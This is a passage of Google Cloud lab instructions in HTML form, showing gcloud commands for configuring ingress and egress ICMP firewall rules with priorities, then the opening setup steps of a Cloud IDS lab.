</span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li><li><p><span>Switch to your second Cloud Shell window (or open a new one).</span></p></li><li><p><span>In the second Cloud Shell, create a firewall ingress rule to deny ICMP traffic from any IP with a priority of 500:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-deny-icmp-all --network \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork --action DENY --direction INGRESS --rules icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority 500</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Switch back to the first Cloud Shell connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance, and try to ping the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>It should no longer work. This new rule has a priority of 500, where the allow rule is 1,000.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><p><span>Now change the deny rule to a priority of 2,000.</span></p><ol start='' ><li><p><span>In the second Cloud Shell, modify the firewall rule just created and change the priority to </span><code>2000</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules update \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-deny-icmp-all \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority 2000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Switch back to the first Cloud Shell connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance, and try to ping the </span><strong><span>mynet-vm-2</span></strong><span> instance again:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This time it will work because the deny rule has a lower priority, so the allow rule is the first matching rule.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><h4 id='task-6-configure-egress-firewall-rules'><span>Task 6. Configure egress firewall rules</span></h4><p><span>In this task, you create an egress firewall rule and set the priority to 10,000. You then verify that both ingress and egress rule allow that traffic.</span></p><ol start='' ><li><p><span>From the second Cloud Shell window, list all the current firewall rules:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--filter="network:mynetwork"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>Currently, the VMs are still able to ping each other because the rule that denies ICMP has a higher priority than the allow ICMP rule.</span></p><p><span>Now try an egress rule.</span></p><ol start='' ><li><p><span>Create a firewall egress rule to block ICMP traffic from any IP with a priority of </span><code>10000</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-egress-deny-icmp-all --network \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork --action DENY --direction EGRESS --rules icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority 10000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>List all the current firewall rules again:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--filter="network:mynetwork"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice that the egress rule priority is set to 10,000, which is much higher than the rules created earlier.</span></p><ol start='' ><li><p><span>Switch back to the first Cloud Shell connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance and try to ping the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>It should no longer work</span></strong><span>. Even though the egress rule has a much higher priority of 10,000, it is still blocking traffic. This is because for traffic to be allowed, there must be both an ingress and egress rule allowing that traffic. The priority of ingress rules does not affect the priority of egress rules.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a firewall rule with priority and egress firewall rule.</span></p><p>&nbsp;</p><h4 id='congratulations-4'><span>Congratulations!</span></h4><p><span>In this lab, you did the following:</span></p><ul><li><p><span>Created an auto-mode network, a custom-mode network, and associated subnetworks.</span></p></li><li><p><span>Investigated firewall rules in the default network, and then deleted the default network.</span></p></li><li><p><span>Used firewall rule features for more precise and flexible control of connections.</span></p></li></ul><p>&nbsp;</p><h3 id='lab---getting-started-with-cloud-ids'><span>LAB - Getting Started with Cloud IDS</span></h3><h4 id='overview-5'><span>Overview</span></h4><p><span>In this lab, you deploy </span><a href='https://cloud.google.com/intrusion-detection-system'><span>Cloud Intrusion Detection System (Cloud IDS)</span></a><span>, a next-generation advanced intrusion detection service that provides threat detection for intrusions, malware, spyware, and command-and-control attacks. You simulate multiple attacks and view the threat details in the Google Cloud console.</span></p><p><img src="https://cdn.qwiklabs.com/ENIYqVr9SB12IcIIqVmupO%2BfT7DCqkiZdHgtHJtYDuA%3D" referrerpolicy="no-referrer" alt="Cloud IDS Infrastructure Diagram"></p><h4 id='objectives-4'><span>Objectives</span></h4><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Build out a Google Cloud networking environment as shown in the previous diagram.</span></p></li><li><p><span>Create a Cloud IDS endpoint.</span></p></li><li><p><span>Create two virtual machines using gcloud CLI commands.</span></p></li><li><p><span>Create a Cloud IDS packet mirroring policy.</span></p></li><li><p><span>Simulate attack traffic from a virtual machine.</span></p></li><li><p><span>View threat details in the Cloud console and Cloud Logging.</span></p></li></ul><h4 id='setup'><span>Setup</span></h4><h4 id='before-you-click-the-start-lab-button-2'><span>Before you click the Start Lab button</span></h4><p><strong><span>Note: Read these instructions.</span></strong></p><p>&nbsp;</p><p><span>Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources will be made available to you.</span></p><p><span>This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.</span></p><h4 id='what-you-need-2'><span>What you need</span></h4><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li><li><p><span>Time to complete the lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> If you already have your own personal Google Cloud account or project, do not use it for this lab.</span></p><p><strong><span>Note:</span></strong><span> If you are using a Pixelbook, open an Incognito window to run this lab.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-console-2'><span>How to start your lab and sign in to the Console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.</span></p><p><img src="https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D" referrerpolicy="no-referrer" alt="Credentials panel"></p></li><li><p><span>Copy the username, and then click </span><strong><span>Open Google Console</span></strong><span>. The lab spins up resources, and then opens another tab that shows the </span><strong><span>Choose an account</span></strong><span> page.</span></p><p><strong><span>Note:</span></strong><span> Open the tabs in separate windows, side-by-side.</span></p></li><li><p><span>On the Choose an account page, click </span><strong><span>Use Another Account</span></strong><span>. The Sign in page opens.</span></p><p><img src="https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D" referrerpolicy="no-referrer" alt="Choose an account dialog box with Use Another Account option highlighted "></p></li><li><p><span>Paste the username that you copied from the Connection Details panel. Then copy and paste the password.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).</span></p><ol start='' ><li><p><span>Click through the subsequent pages:</span></p></li></ol><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul><p><span>After a few moments, the Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> You can view the menu with a list of Google Cloud Products and Services by clicking the </span><strong><span>Navigation menu</span></strong><span> at the top-left.</span><img src="https://cdn.qwiklabs.com/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D" referrerpolicy="no-referrer" alt="Cloud Console Menu"></p><h4 id='activate-google-cloud-shell-3'><span>Activate Google Cloud Shell</span></h4><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - @.com (active)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" 